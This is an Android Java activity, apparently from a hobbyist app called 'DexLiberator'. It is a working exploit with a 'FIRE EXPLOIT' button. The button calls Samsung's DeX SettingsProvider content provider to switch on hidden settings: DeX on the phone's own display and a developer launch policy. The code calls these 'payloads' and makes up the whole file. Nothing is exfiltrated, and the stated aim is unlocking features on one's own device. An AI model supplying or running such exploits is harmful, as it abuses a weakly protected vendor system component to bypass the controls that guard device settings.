package com.example.dexliberator; // <--- MAKE SURE THIS MATCHES YOUR PACKAGE NAME AT THE TOP!

import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. Build the UI
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);

        Button btnFire = new Button(this);
        btnFire.setText("FIRE EXPLOIT"); // <--- LOOK FOR THIS BUTTON
        btnFire.setTextSize(24f);
        layout.addView(btnFire);

        setContentView(layout);

        // 2. The Button Logic
        btnFire.setOnClickListener(v -> {
            if (Settings.System.canWrite(this)) {
                // If we have permission, FIRE!
                fireExploit();
            } else {
                // If not, ask for it
                Toast.makeText(this, "Grant Permission First!", Toast.LENGTH_SHORT).show();
                Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });
    }

    private void fireExploit() {
        new Thread(() -> {
            try {
                ContentResolver resolver = getContentResolver();
                Uri providerUri = Uri.parse("content://com.sec.android.desktopmode.uiservice.SettingsProvider");

                // Payload 1: Enable DeX on Phone
                Bundle p1 = new Bundle();
                p1.putString("key", "enable_dex_on_builtin_display");
                p1.putString("val", "true");
                resolver.call(providerUri, "setSettings", null, p1);

                // Payload 2: Enable Dev Mode
                Bundle p2 = new Bundle();
                p2.putString("key", "launch_policy_developer_enabled");
                p2.putString("val", "true");
                resolver.call(providerUri, "setSettings", null, p2);

                // Success Message
                runOnUiThread(() -> Toast.makeText(this, "☢️ PAYLOAD DELIVERED ☢️", Toast.LENGTH_LONG).show());

            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "ERROR: " + e.getMessage(), Toast.LENGTH_LONG).show());
            }
        }).start();
    }
}